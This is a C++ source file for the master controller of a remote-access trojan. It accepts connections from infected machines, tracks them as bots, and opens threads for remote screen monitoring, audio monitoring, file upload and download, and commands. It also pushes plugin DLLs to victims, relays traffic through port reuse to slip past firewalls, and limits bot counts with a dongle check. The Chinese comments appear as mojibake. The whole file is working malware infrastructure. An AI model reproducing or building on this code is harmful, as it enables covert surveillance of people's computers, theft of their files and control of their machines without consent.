#include "stdafx.h"
#include <WinSock2.h>
#include <process.h>
#include <algorithm>
#include "MasterService.h"
#include "MasterPlugin.h"
#include "ObjViewPane.h"
#include "conn.h"
#include "macro.h"
#include "svrdll.h"
#include "WjcDes.h"
#include "zlib.h"
#include "softdog.h"

using namespace std;

#pragma comment(lib, "Rpcrt4.lib") 
#pragma comment(lib, "zlib.lib") 

short int DogAddr,DogBytes;
void far * DogData;

static map<pair<int, unsigned short>,  int> allListenPorts;
static vector<string> allClientIPs;
static int objIdx = MIN_LEAF_NODE;

HANDLE eventHandle = NULL;

struct tagListenData
{
	MasterService* service;
	conn thisConn;
	int listenPort;
	int listenType;
};

struct tagThreadData
{
	MasterService* pService;
	void* param;
	void* data;
	char ip[16];
	unsigned short port;
	unsigned short listenPort;
	unsigned short listenType;
};

/**GUIDת�����ַ���*/
static void GUIDToString(unsigned char* guid, char* sGUID, int n)
{
	unsigned char *strGUID = NULL;
	UuidToStringA((GUID*)guid, &strGUID);				
	strcpy_s(sGUID, n, (char*)strGUID);
	RpcStringFreeA(&strGUID);
}

static CRITICAL_SECTION myMutex;
static CRITICAL_SECTION countMutex;
static int currentMach = 0;
static int allowMach = 10;
static int myLen = 10240;
static char *myBuf = new char[myLen];

/**�������ݶ�ȡ���� ��ҪΪ������������н��лص�*/
static int ReadFromTrojan(conn s, char* buf, int dataLen, int isCompressed, 
						  int bufLen = 0, int flags = 0)
{
	int recvLen = conn_read(s, buf, dataLen, flags);
	if(recvLen < 0)	return -1;
	if(bufLen == 0) bufLen = dataLen;
	dataLen = recvLen;
	
	if(isCompressed && recvLen > 0)
	{
		EnterCriticalSection(&myMutex);
		if(myLen < dataLen)
		{
			myLen = dataLen;
			delete []myBuf;
			myBuf = new char[myLen];
		}

		memcpy(myBuf, buf, recvLen);
			
		if(isCompressed == 1)//����
		{
			recvLen = Des_Go(buf, myBuf, recvLen, myKey, strlen(myKey), true);
		}
		else
		{
			uLongf destLen = *(int*)buf;
			if(bufLen < destLen)
				return -3;//�ڴ治�� ��Ҫ���·���

			if(uncompress((Bytef *)buf, &destLen, (Bytef *)myBuf + 4, dataLen - 4) == Z_OK)
				recvLen = destLen;
			else
				destLen = -1;
		}
		LeaveCriticalSection(&myMutex);
		//KDebug("Read %d<--> Encrypt %d",	dataLen, recvLen);
	}

	return recvLen < 0 ? -2 : recvLen;
}

/**��������д���� ��ҪΪ������������н��лص�*/
static int WriteToTrojan(conn s, char* hdr, char* buf, int dataLen, int isCompressed)
{
	control_header* header = (control_header*)hdr;
	int len = dataLen;
	int r = 0;

	//û��ͷ��ʱ�� ������ֱ�ӷ���
	if(header == NULL && isCompressed == 0)
		return conn_write(s, buf, dataLen, 0);
	
	//�����κδ���ֱ�ӷ���
	header->dataLen = len;
	header->isCompressed = 0;
	if(conn_write(s, (const char*)header, sizeof(*header), 0) < 0)
		return -1;
	if(len > 0 && conn_write(s, buf, len, 0) < 0)
		return -1;

	return dataLen;
}

MasterService::MasterService()
{
	m_bExit = FALSE;
	m_allListenThreads.clear();
	m_allConns.clear();
	m_allListenThreadIds.clear();

	strcpy_s(m_srInfo.sAuthor, sizeof(m_srInfo.sAuthor), "greatyao");
	strcpy_s(m_srInfo.sName, sizeof(m_srInfo.sName), "�ܿز������");
	strcpy_s(m_srInfo.sDesc, sizeof(m_srInfo.sDesc), "Ϊ�������������ṩ����");
	m_srInfo.uReserved = 0x0100;

	InitializeCriticalSection(&myMutex);
	InitializeCriticalSection(&countMutex);
}

MasterService::~MasterService()
{
	DeleteCriticalSection(&myMutex);
	DeleteCriticalSection(&countMutex);
}

BOOL MasterService::OnInitalize()
{
#ifdef TRIVAL
	DogBytes = sizeof(DWORD);
	DogData = &allowMach;
	DogAddr = 50;

	DWORD dwStatus = ReadDog();
	if (dwStatus==0)
	{		
		KDebug(" read int succeeded.\r read: \"%d\"  from: %d\r\r", allowMach, DogAddr);
	}
	else if (dwStatus==30002)
	{
		AfxMessageBox("û�������ļ�����в鵽���ܹ����߼��ܹ��������������յ����ƣ�");
		KDebug(" read int failed.\r error code = %ld\r\r", dwStatus);
	}
	else
	{
	}
#endif

	WSADATA wsaData;
	if(WSAStartup(MAKEWORD(2, 2), &wsaData))	return FALSE;

	//conn_startup();

	//�õ�������
	char hostname[256];
	if(gethostname(hostname, sizeof(hostname)) != 0)	return FALSE;

	//�õ�����IP
	hostent *pHostent = gethostbyname(hostname);
	if(pHostent == NULL)	return FALSE;

	hostent& he = *pHostent;
	sockaddr_in sa;	
	for (int i = 0; he.h_addr_list[i]; i++)
	{
		memcpy(&sa.sin_addr.s_addr, he.h_addr_list[i], he.h_length);
		allClientIPs.push_back(inet_ntoa(sa.sin_addr));
		KDebug("client address %s", inet_ntoa(sa.sin_addr));
	}

	//��ȡ�����ļ�
	GetModuleFileNameA(NULL, iniFileName, MAX_PATH-5);
	char *p = strrchr(iniFileName, '.');
	*p = 0;
	strcat_s(iniFileName, sizeof(iniFileName), ".ini");

	//���������ļ��д��ڵĶ˿�
	char temp[MAX_PATH] = {0}, tmp2[MAX_PATH] = {0};
	GetPrivateProfileStringA("�����˿�", "����", "", temp, MAX_PATH, iniFileName);
	int nPorts = atoi(temp);
	for(int i = 0; i < nPorts; i++)
	{
		sprintf(temp, "����%d", i);
		GetPrivateProfileStringA("�����˿�", temp, "", tmp2, MAX_PATH, iniFileName);
		int type = atoi(tmp2);

		sprintf(temp, "�˿�%d", i);
		GetPrivateProfileStringA("�����˿�", temp, "", tmp2, MAX_PATH, iniFileName);
		unsigned short port = atoi(tmp2);

		OpenListenPort(type, port);
	}

	//Ϊ����ǽ�Ķ˿��������
	for(int i = 0; i < sizeof(tcpPorts)/sizeof(int); i++)	OpenListenPort(CONN_TCP, tcpPorts[i]);
	for(int i = 0; i < sizeof(udpPorts)/sizeof(int); i++)	OpenListenPort(CONN_UDP1, udpPorts[i]);
	for(int i = 0; i < sizeof(httpPorts)/sizeof(int); i++)	OpenListenPort(CONN_HTTP_SERVER, httpPorts[i]);

	UpdateProfile();

	return TRUE;
}

BOOL MasterService::OnUninitalize()
{
	m_bExit = TRUE;
	for(vector<HANDLE>::iterator iter = m_vDispatchHandles.begin(); iter != m_vDispatchHandles.end(); iter++)
	{
		TerminateThread(*iter, -1);
		CloseHandle(*iter);	
	}

	for(map<int, HANDLE>::iterator it = m_allListenThreads.begin(); it != m_allListenThreads.end(); it++)
	{
		TerminateThread(it->second, -1);
		CloseHandle(it->second);
		conn_close((conn)(it->first));
	}

	return TRUE;
}

BOOL MasterService::OnService(UINT id, WPARAM wp, LPARAM lp)
{
	if(wp == NULL) return FALSE;
	switch(id)
	{
	case ZCM_GET_OBJ:
		{
			//ͨ������ỰS��Ѱ��Ŀ�����Ϣ
			void* s = (void*)wp;
			struct TrojanInfo* info = (struct TrojanInfo*)lp;
			if(m_allInfos.find(s) == m_allInfos.end())
				memset(info, 0, sizeof(struct TrojanInfo));
			else
				memcpy(info, &m_allInfos[s], sizeof(struct TrojanInfo));
		}
		break;

	case ZCM_SEL_OBJ:
		{
			//�������ڵ�ֵ��ѡ��Ŀ���
			int idx = *((int*)wp);
			std::map<void*, struct TrojanInfo>::iterator it;
			for(it = m_allInfos.begin(); it != m_allInfos.end(); it++)
				if(it->second.iData == idx) break;

			if(it == m_allInfos.end())
			{
				ISite::SetCurrentTarget(NULL);
				ISite::SetStatus(2, "��û��ѡ���κ��⼦");
			}
			else
			{
				ISite::SetCurrentTarget(&it->second);
				ISite::SetStatus(2, "��ѡ�����⼦����%s", &it->second.trojanip);
			}
			
			//֪ͨ�������Ŀ�����Ϣ
			ISite::Notify(ZCM_SEL_OBJ, (WPARAM)ISite::GetSelectedTarget(), NULL);
		}
		break;
	
	case ZCM_RECV_MSG:
		ProcessRecvData(wp, lp);
		break;

	case ZCM_WM_WRITE_LOG:
		((MasterPlugin*)g_Plugin)->GetOutputPane()->WriteLog((LPSTR)wp); 
		break;
	
	case ZCM_SEND_MSG:
		return SendMsgToTrojan(wp) > 0;
		break;

	case ZCM_UPDATE_TROJAN:
		UpdatePlugins();
		break;

	default	:
		break;
	}
	return FALSE;
}

void MasterService::UpdateProfile()
{
	//д�����ļ�
	char temp[MAX_PATH] = {0}, tmp2[MAX_PATH] = {0};
	int count = 0;
	int nPorts = allListenPorts.size();
	sprintf(temp, "%d", nPorts);
	WritePrivateProfileStringA("�����˿�", "����", temp, iniFileName);
	for(map<pair<int, unsigned short>,  int>::iterator it = allListenPorts.begin(); it != allListenPorts.end(); it++)
	{
		sprintf(temp, "����%d", count);
		sprintf(tmp2, "%d", it->first.first);
		WritePrivateProfileStringA("�����˿�", temp, tmp2, iniFileName);

		sprintf(temp, "�˿�%d", count);
		sprintf(tmp2, "%d", it->first.second);
		WritePrivateProfileStringA("�����˿�", temp, tmp2, iniFileName);

		count++;
	}
}

int MasterService::OpenListenPort(int type, unsigned short port, bool update)
{
	//��������͵ļ����Ѿ����ڣ�ɶ������
	pair<int, unsigned short> thisPair = make_pair(type, port);
	if(allListenPorts.find(thisPair) != allListenPorts.end())
	{
		KDebug("we already have (%d, %d) of connection", type, port);
		return 0;
	}
	
	//���򴴽�һ���µ��׽���
	KDebug("we will create (%d, %d) of connection", type, port);
	conn myConn = conn_socket(type);
	if(!myConn)	return -1;

	int ret;
	struct sockaddr_in cliaddr;
	memset(&cliaddr, 0,  sizeof(cliaddr));
	cliaddr.sin_family = AF_INET;
	cliaddr.sin_port = htons(port);
	cliaddr.sin_addr.s_addr = /*inet_addr(allClientIPs[0].c_str());*/INADDR_ANY;

	int opt = 1;
	ret = conn_setsockopt(myConn, 0, ConnOpt::CONN_REUSEADDR, &opt, sizeof(opt));
	if(ret != 0)
	{
		KDebug("REUSEADDR status %d %d", ret, conn_error);
		return -1;
	}

	ret = conn_bind(myConn, (struct sockaddr*)&cliaddr, sizeof(cliaddr));
	if(ret != 0)
	{
		KDebug("binding status %d --> %d", ret, conn_error);
		return -1;
	}
	
	ret = conn_listen(myConn, 5);
	if(ret != 0)
	{
		KDebug("listening status %d --> %d", ret, conn_error);
		return -1;
	}
	
	struct tagListenData* data = new struct tagListenData();
	data->service = this;
	data->thisConn = myConn;
	data->listenType = type;
	data->listenPort = port;

	//���������߳�
	unsigned int threadId;
	HANDLE threadHandle;
	threadHandle = (HANDLE)::_beginthreadex(NULL, 0, ListenThread, data, 0, &threadId);
	if (threadHandle == NULL)	return -1;

	//��¼�ڰ�
	m_allConns.push_back(myConn);
	allListenPorts[thisPair] = 1;
	m_allListenThreadIds[(int)myConn] = threadId;
	m_allListenThreads[(int)myConn] = threadHandle;

	if(update)	UpdateProfile();

	return 0;
}

/************************************************************************/
/* �����̣߳������ľ����������ӣ���ַ�һ���߳�ר�Ŵ����ľ���ͨ��   */
/************************************************************************/
unsigned int WINAPI MasterService::ListenThread(void* param)
{
	struct tagListenData* listenData = (struct tagListenData*)param;
	MasterService* pStandService = listenData->service;
	conn thisConn = listenData->thisConn;

	while(1)
	{
		__try
		{
			//����յ��˳�������
			if(pStandService->m_bExit)	return 0;

			//�����õ��µĿͻ�����
			struct sockaddr_in addr;
			int len = sizeof(addr);
			conn incoming = conn_accept(thisConn, (struct sockaddr*)&addr, &len);

			//��ȡ��ǣ�����Ҫ���ܻ����ļ�����ģ�
			unsigned char mainTask = 0;
			struct control_header backHdr = INITIALIZE_HEADER(CONTROL_FEEDBACK);
			char httpHeader[1024] = {0};
			int n = conn_read(incoming, (char*)&mainTask, sizeof(mainTask), 0, httpHeader);
			if(n < 0){	KDebug("Connection lost [mark]");conn_close(incoming); continue; }
			
			//����̲߳������������ַ��̵߳�������ÿͻ�
			unsigned int threadId;
			HANDLE handle;
			struct tagThreadData* threadData = new tagThreadData();
			memset(threadData, 0, sizeof(*threadData));
			threadData->pService = pStandService;
			threadData->param = incoming;
			strcpy(threadData->ip, inet_ntoa(addr.sin_addr));
			threadData->port = ntohs(addr.sin_port);
			threadData->listenType = listenData->listenType;
			threadData->listenPort = listenData->listenPort;

			if(mainTask == 'M')
			{
				WriteToTrojan(incoming, (char*)&backHdr, NULL, 0, 0);
				handle = (HANDLE)_beginthreadex(NULL, 0, DispatchThread, (void*)threadData, 0, &threadId);
			}
			else if(mainTask == 'F')
			{
				WriteToTrojan(incoming, (char*)&backHdr, NULL, 0, 0);
				handle = (HANDLE)_beginthreadex(NULL, 0, FileUpDownThread, (void*)threadData, 0, &threadId);
			}
			else if(mainTask == 'S')
			{
				WriteToTrojan(incoming, (char*)&backHdr, NULL, 0, 0);
				handle = (HANDLE)_beginthreadex(NULL, 0, MonitorScreenThread, (void*)threadData, 0, &threadId);
			}
			else if(mainTask == 'A')
			{
				WriteToTrojan(incoming, (char*)&backHdr, NULL, 0, 0);
				handle = (HANDLE)_beginthreadex(NULL, 0, MonitorAudioThread, (void*)threadData, 0, &threadId);
			}
			else
			{
				if(n == 1)strcat(httpHeader, (char*)&mainTask);
				threadData->data = httpHeader;
				eventHandle = CreateEvent(NULL, FALSE, FALSE, NULL);
				handle = (HANDLE)_beginthreadex(NULL, 0, PortReuseThread, (void*)threadData, 0, &threadId);
				WaitForSingleObject(eventHandle, INFINITE);
				CloseHandle(eventHandle);
			}

			if(handle)	pStandService->m_vDispatchHandles.push_back(handle);
			 //else		delete threadData;
		}
		__except(EXCEPTION_EXECUTE_HANDLER)
		{
			KDebug("ListenThread exception");
		}
	}

    KDebug("Leave ListenThread");
	return 0; 
}

unsigned int  MasterService::MonitorAudioThread(void* param)
{
	struct tagThreadData* threadData = (struct tagThreadData*)param;
	conn s = (conn)threadData->param;
	MasterService* pService = threadData->pService;	
	DispatchData patchData;
	char* ip = threadData->ip;
	int port = threadData->port;
	int nStatus = 0;
	
	KDebug("Incoming a audio request %p", s);

	memset(&patchData, 0, sizeof(patchData));
	patchData.s = s;
	patchData.readFunction = ReadFromTrojan;
	patchData.WriteFunction = WriteToTrojan;
	patchData.recvData.type = threadData->listenType;
	patchData.recvData.port = threadData->port;
				
	ISite::Notify(ZCM_WM_AUDIO,(WPARAM)&patchData, NULL);

	return 0;
}

unsigned int MasterService::MonitorScreenThread(void* param)
{
	struct tagThreadData* threadData = (struct tagThreadData*)param;
	conn s = (conn)threadData->param;
	MasterService* pService = threadData->pService;	
	DispatchData patchData;
	char* ip = threadData->ip;
	int port = threadData->port;
	int nStatus = 0;
	
	KDebug("Incoming a screen request %p", s);

	memset(&patchData, 0, sizeof(patchData));
	patchData.s = s;
	patchData.readFunction = ReadFromTrojan;
	patchData.WriteFunction = WriteToTrojan;
	patchData.recvData.type = threadData->listenType;
	patchData.recvData.port = threadData->port;
				
	ISite::Notify(ZCM_WM_SCREEN,(WPARAM)&patchData, NULL);

	return 0;
}


/************************************************************************/
/* ר�Ŵ����ľ�����󣨶˿ڸ��ã�                                        */
/************************************************************************/
unsigned int MasterService::PortReuseThread(void* param)
{
	struct tagThreadData* threadData = (struct tagThreadData*)param;
	conn s = (conn)threadData->param;
	MasterService* pService = threadData->pService;
	int listenPort = threadData->listenPort;
	int listenType = threadData->listenType;
	char* ip = threadData->ip;
	char httpHeader[1024] = {0};  strcpy(httpHeader, (char*)threadData->data);
	int port = threadData->port;
	conn echoConn;
	SetEvent(eventHandle);
	
	KDebug("incoming an client %p, forward it to port resue module", s);
			
	//����˳���־
	if(pService->m_bExit)		
	{
		conn_close(s);
		delete threadData;
		return -1;
	}

	KDebug("%d %s", strlen(httpHeader), httpHeader);

	//�����Ƕ˿ڸ��ò���
	echoConn = conn_socket(listenType == CONN_HTTP_SERVER ? CONN_HTTP_CLIENT : listenType);
	int ret1 = -1;
	if(echoConn)
	{
		sockaddr_in addr;
		addr.sin_family = AF_INET;
		addr.sin_port = htons(listenPort);
		addr.sin_addr.s_addr = inet_addr("127.0.0.1");
		KDebug("try connect to localhost [%d, %d]... ", listenType, listenPort);
		ret1 = conn_connect(echoConn, (const struct sockaddr*)&addr, sizeof(addr));
		if(ret1 == 0)	
		{
			KDebug("[Yes]");
			conn_write(echoConn, httpHeader, strlen(httpHeader), 1);
		}
		else KDebug("[No]: %d", conn_error);
	}
	conn_set allConns;
	if(ret1 == 0)	allConns.push_back(echoConn);
	allConns.push_back(s);
			
	while(1)
	{
		conn_set readConns, excpConns;
		char buffer[1024] = {0};
		int n = sizeof(buffer), nRecv;

		int r = conn_selectEx(allConns, &readConns, &excpConns, 5000);
		if(r < 0)	//����
		{
			KDebug("selectEx failed %d", conn_error);
			break;		
		}
		else if(r == 0)	continue;//��ʱ
		
		//�������ӶϿ������
		//if(CONN_ISSET(echoConn, &excpConns))
		//	allConns.erase(find(allConns.begin(), allConns.end(), echoConn));
		
		//��localhost���յ�����Ϣ��ת����ʵ��Conn
		if(CONN_ISSET(echoConn, &readConns) || CONN_ISSET(s, &excpConns))
		{
			nRecv = conn_read(echoConn, buffer, sizeof(buffer), 1);
			KDebug("localhost recv msg %d", nRecv);
			if(nRecv > 0)
			{
				KDebug("localhost[%d, %d] recv msg, forward to actual client", listenType, listenPort);
				conn_write(s, buffer, nRecv, 1);
			}
			else
				allConns.erase(find(allConns.begin(), allConns.end(), echoConn));
		}

		//��ʵ��Conn���ܵ�����Ϣ������ת����localhost
		if(CONN_ISSET(s, &readConns) || CONN_ISSET(s, &excpConns))
		{
			nRecv = conn_read(s, buffer, sizeof(buffer), 1);
			KDebug("actual conn recv msg %d", nRecv);
			if(nRecv <= 0)
			{
				KDebug("session %s:%d disconnected", ip, port);
				break;
			}
			conn_write(echoConn, buffer, nRecv, 1);
		}
	}

	conn_close(s);
	if(echoConn)	conn_close(echoConn);	
	delete threadData;
	return 0;
}

/************************************************************************/
/* ר�Ŵ���ľ����ļ��ϴ����ص��߳�                                      */
/************************************************************************/
unsigned int MasterService::FileUpDownThread(void* param)
{
	struct tagThreadData* tData = (struct tagThreadData*)param;
	conn s = (conn)tData->param;
	MasterService* pService = tData->pService;	
	DispatchData pData;
	struct control_header header;
	int n = sizeof(header), nRecv;
	char* ip = tData->ip;
	int port = tData->port;
	
	KDebug("incoming a file upload/download request %p", s);
			
	//����˳���־
	if(pService->m_bExit)		
	{
		conn_close(s);
		delete tData;
		return -1;
	}

	nRecv = ReadFromTrojan(s, (char*)&header, n, 0);
	if(nRecv < 0)
	{
		KDebug("file upload/download %p exception ", s);
		return -1;
	}
	KDebug("recv file request %d cmd %4x",nRecv, header.command); 

	memset(&pData, 0, sizeof(pData));
	pData.s = s;
	strcpy_s(pData.recvData.trojanip, sizeof(pData.recvData.trojanip), ip);
	pData.recvData.port = port;
	pData.recvData.header = &header;
	pData.readFunction = ReadFromTrojan;
	pData.WriteFunction = WriteToTrojan;
				
	ISite::Notify(ZCM_WM_UPLOAD_DOWNLOAD,(WPARAM)&pData, NULL);
	
	return 0;
}

static DispatchData GenDispatchData(void* s, const char* ip, unsigned short port, 
									control_header* header, void* body)
{
	DispatchData pData = {0};
	pData.s = s;
	GUIDToString(header->password, pData.recvData.guid, sizeof(pData.recvData.guid));
	strcpy(pData.recvData.trojanip, ip);
	pData.recvData.port = port;
	pData.recvData.header = header;
	pData.recvData.body = body;

	return pData;
}

/************************************************************************/
/* �ѽ��յ�������ַ���ȥ                                               */
/************************************************************************/

//ÿ������һ���µ�ľ�����ˣ�����ͨ��ľ�������Ϸ���keepAlive��Ϣ
//���¿ͻ����յ�����Ϣ֮��ͨ��GUIDѰ����ص���Ϣ����������Ӧ�Ľڵ�
//�û�����ߵ����νڵ�ѡ��ĳһ��Ŀ�������ϵͳ�ᷢ�͸ýڵ���Ϣ�����еĲ��
//���ÿ�����������ľ������ӻỰ

unsigned int MasterService::DispatchThread(void* param)
{
	char echoBuf[4096];
	char recvBuf[10240];
	struct control_header backHdr = INITIALIZE_HEADER(CONTROL_FEEDBACK);
	struct tagThreadData* threadData = (struct tagThreadData*)param;
	conn s = (conn)threadData->param;
	MasterService* pService = threadData->pService;
	int listenPort = threadData->listenPort;
	int listenType = threadData->listenType;
	char* ip = threadData->ip;
	int port = threadData->port;
	DispatchData serverData = {0};
	conn_set allConns;

#ifdef TRIVAL
	if(currentMach >= allowMach)
	{
		Sleep(2000);
		goto myclose;
	}
#endif

	EnterCriticalSection(&countMutex);
	currentMach++;
	LeaveCriticalSection(&countMutex);

	KDebug("Incoming a connection %p %s:%d on [%d, %d]", s, ip, port, listenType, listenPort);

	allConns.push_back(s);
	while(1)
	{
		conn_set readConns, excpConns;
		struct control_header header = {0};
		int n = sizeof(header), nRecv;

		//����˳���־
		if(pService->m_bExit)	break;
		
		__try
		{
			int r = conn_selectEx(allConns, &readConns, &excpConns, 5000);
			if(r < 0)	//����
			{
				KDebug("SelectEx failed %d", conn_error);
				break;		
			}
			else if(r == 0)	continue;//��ʱ
			
			if(CONN_ISSET(s, &readConns) || CONN_ISSET(s, &excpConns))
			{
				//������Ϣͷ
				nRecv = ReadFromTrojan(s, (char*)&header, n, 0);
				//KDebug("%d %d", nRecv, listenType);
				if(nRecv == -1 || (nRecv == 0 && listenType != CONN_HTTP_SERVER)) //http���Զ���content-lengthΪ0
				{
					KDebug("Connection %p %s:%d lost [hdr] since %d", s, ip, port, conn_error);
					pService->UpdateTrojanStatus(&serverData, false);
					break;
				}

				//�����ϢͷΪ��Ч�ģ�������������Ϣͷ�е��������ĳ��Ƚ�����Ϣ��
				if(ISVALID_HEADER(header))
				{
					int dataLen = header.dataLen == -1 ? 0 : header.dataLen;
					int recvLen = 0;
					int bufLen = (dataLen/8+1)*8;
					unsigned short cmd = header.command;
					memset(recvBuf, 0, bufLen+1);
					
					//if(header.command != CONTROL_FEEDBACK)
					//	WriteToTrojan(s, (char*)&backHdr, NULL, 0, 0);
					if(header.command != CONTROL_KEEPALIVE)  
						KDebug("Recv resp cmd 0x%4x %d", cmd, header.response);
					
					if(dataLen > 0)
					{
						recvLen = ReadFromTrojan(s, recvBuf, dataLen, header.isCompressed, sizeof(recvBuf));						
						if(recvLen > 0 || (recvLen == 0 && listenType == CONN_HTTP_SERVER))
						{
							header.dataLen = recvLen; 
							//WriteToTrojan(s, (char*)&backHdr, NULL, 0, 0);
						}
						else
						{
							if(recvLen == -2)
								continue;
							else if(serverData.recvData.guid[0] != 0)	
							{
								KDebug("Connection %p %s:%d lost [body] since %d", s, ip, port, conn_error);
								pService->UpdateTrojanStatus(&serverData, false);
								break;
							}
						}
					}

					DispatchData pData = GenDispatchData(s, ip, port, &header, recvBuf);
					memcpy(&serverData, &pData, sizeof(DispatchData));
					
					ISite::Service(ZCM_RECV_MSG,(WPARAM)&pData, NULL);
				}
			}
		}
		__except(EXCEPTION_EXECUTE_HANDLER)
		{
			KDebug("DispatchThread exception");
		}
	}

	EnterCriticalSection(&countMutex);
	currentMach--;
	LeaveCriticalSection(&countMutex);

myclose:
	KDebug("Leave DispatchThread");
	conn_close(s);
	delete threadData;
	return 0;
}

/************************************************************************/
/* ����ͻ���ؽ��ܵ�ľ��˵���Ϣ                                        */
/************************************************************************/
int MasterService::ProcessRecvData(WPARAM wp, LPARAM lp)
{
	if(wp == NULL)	return -1;

	DispatchData* disData = (DispatchData*)wp;
	control_header* header = disData->recvData.header;
	
	//��������KeepAlive��Ϣ
	if(header->command == CONTROL_KEEPALIVE || header->command == CONTROL_LOGIN)
	{
		//���ȼ�¼������������Ĳ����Ϣ
		if(header->command == CONTROL_KEEPALIVE)
			RecordDllInfo(disData->recvData.guid, header->dataLen, (char*)disData->recvData.body);
		//Ȼ����·����״̬�����ߣ�
		((MasterService*)g_Service)->UpdateTrojanStatus(disData, true);
	}
	else
	{
		//�����ܵ�����Ϣ�㲥��ȥ
		ISite::Notify(ZCM_RECV_MSG, wp, lp);
	}

	return 0;
}

static struct TrojanInfo GenInfo(DispatchData* patch, bool online)
{
	struct TrojanInfo info = {0};
	info.bOnlineFlag = online;
	info.s = patch->s;
	strcpy(info.trojanip, patch->recvData.trojanip);
	info.port = patch->recvData.port;
	strcpy(info.guid, patch->recvData.guid);
	info.ostype = patch->recvData.header->reserved;
	info.timestamp = time(NULL);

	return info;
}

/************************************************************************/
/* ����ľ���������߻���������Ϣ                                        */
/************************************************************************/
void MasterService::UpdateTrojanStatus(DispatchData* patch, bool online)
{
	if(patch->recvData.guid[0] == 0)	return;
	
	STANDARDDATA info = GenInfo(patch, online);
	unsigned short cmd = patch->recvData.header->command;
	void* s = patch->s;
	bool isFirst = false;
	CString addr = ISite::GetIPAddrPort(info.trojanip, info.port);

	info.bOnlineFlag = online;
	if(m_allInfos.find(s) == m_allInfos.end())
	{
		info.iData = objIdx ++;
		m_allInfos[s] = info;
		isFirst = true;
	}

	if(online)
	{
		if(isFirst)
		{
			ISite::Notify(ZCM_NEW_ONLINE, (WPARAM)&m_allInfos[s], NULL);
			ISite::SetStatus(0, "�µ��⼦����%s������", addr);
		}

		if(cmd == CONTROL_LOGIN)
		{
			info.dllCnt = -1;
			strcpy(info.dllInfo, (char*)patch->recvData.body);
			ISite::Notify(ZCM_WM_DESCRIPTION, (WPARAM)&info, NULL);
		}
	}
	else
	{
		ISite::Notify(ZCM_WM_OFFLINE, (WPARAM)&m_allInfos[s], NULL);
		m_allInfos.erase(m_allInfos.find(s));
		ISite::SetStatus(0, "�⼦����%s������", addr);
	}

	ISite::SetStatus(1, "��ǰ����%d���⼦��������", m_allInfos.size());
}

/************************************************************************/
/* ��¼�����������Ϣ                                                   */
/************************************************************************/
void MasterService::RecordDllInfo(char* guid, int dataLen, char *data)
{
}

/************************************************************************/
/* ��ľ��Ŀ�����������                                                 */
/************************************************************************/
int MasterService::SendMsgToTrojan(WPARAM wp)
{
	DispatchData* data = (DispatchData*)wp;
	conn s = (conn)data->s;
	//control_header header = INITIALIZE_ENCYRPT_HEADER(data->sendData.cmd);
	control_header header = INITIALIZE_HEADER(data->sendData.cmd);
	char* buf = (char*)data->sendData.body;
	int len = data->sendData.dataLen;
	header.dataLen = len;
	int r = 0;

	return WriteToTrojan(s, (char*)&header, buf, len, 0);
}

int MasterService::UpdateOneDll(const char* path, const char* fileName)
{
	char newFile[MAX_PATH];
	sprintf(newFile, "%s\\%s", path, fileName);
	
	//�Ƿ�Ϊ�Ϸ��Ĳ��
	HMODULE  hinstLib = LoadLibraryA(newFile);
	if(!hinstLib)	return -1;

	getFuncCnt dllFunCnt = (getFuncCnt)GetProcAddress(hinstLib, "GetDllFuncCnt");
	getDllInfo dllInfos = (getDllInfo)GetProcAddress(hinstLib, "GetDllFuncs");
	if(!dllFunCnt || !dllInfos)	{FreeLibrary(hinstLib); return -1;};	
	FreeLibrary(hinstLib);

	HANDLE fd = CreateFileA(newFile, GENERIC_READ,FILE_SHARE_READ, NULL,
		OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if(fd == INVALID_HANDLE_VALUE)
	{
		KDebug("file open %d", GetLastError());
		return -1;
	}

	LARGE_INTEGER size = { 0,0 };
	size.LowPart = GetFileSize(fd, (unsigned long*)&size.HighPart);
	if(size.HighPart > 0 || size.LowPart > 1000000)	return -2;

	//��ȡ�������
	int fileSize = size.LowPart, totalN = 0;
	const int packageSize = 4*1024;
	char* content = new char[fileSize];
	KDebug("uploading plugin %s size = %d", newFile, fileSize);
	if(ReadFile(fd, content, fileSize, (LPDWORD)&totalN, NULL) == 0)
	{
		delete []content;
		CloseHandle(fd);
		return -1;
	}

	//�������ݵ���������
	dir_info info;
	memset(&info, 0, sizeof(info));
	info.fileSizeHigh = 0;
	info.fileSizeLow = fileSize;
	info.fileType = IS_FILE;
	strncpy(info.name, fileName, strlen(fileName)-4);
	ISite::SendCmd(CONTROL_UPDATE, g_StandardData.s, (char*)&info, sizeof(info));

	totalN = 0;
	while(totalN < fileSize)
	{
		int sendSize = fileSize - totalN;
		if(sendSize > packageSize)	sendSize = packageSize;

		ISite::SendCmd(CONTROL_INFO_FILE, g_StandardData.s, content+totalN, sendSize);
		totalN += sendSize; 
	}

	CloseHandle(fd);
	delete []content;

	return 0;
}
/******************************************************
*** ����ľ������ϵĲ��     *******************
******************************************************/
void MasterService::UpdatePlugins()
{
	char moduleName[MAX_PATH], drive[MAX_PATH], path[MAX_PATH], file[MAX_PATH];
	WIN32_FIND_DATAA wfd;
	HANDLE h;
	char dirPath[MAX_PATH], pattern[MAX_PATH];

	GetModuleFileNameA(NULL, moduleName, MAX_PATH);
	_splitpath(moduleName, drive, path, file, NULL);
	sprintf(dirPath, "%s%s", drive, path);
	strcat(dirPath, "svrdll");
	sprintf(pattern, "%s\\*.dll", dirPath);

	//����svrdllĿ¼�����е�DLL����������µ���������
	if( (h = FindFirstFileA(pattern, &wfd)) == INVALID_HANDLE_VALUE)
	{
		KDebug("FindFirstFile error");
		CloseHandle(h);
		return ;
	}

	do{
		if (!strcmp(wfd.cFileName, ".") || !strcmp(wfd.cFileName, ".."))
			continue;

		if(wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			continue;

		UpdateOneDll(dirPath, wfd.cFileName);	

	}while(FindNextFileA(h, &wfd));

	FindClose(h);
}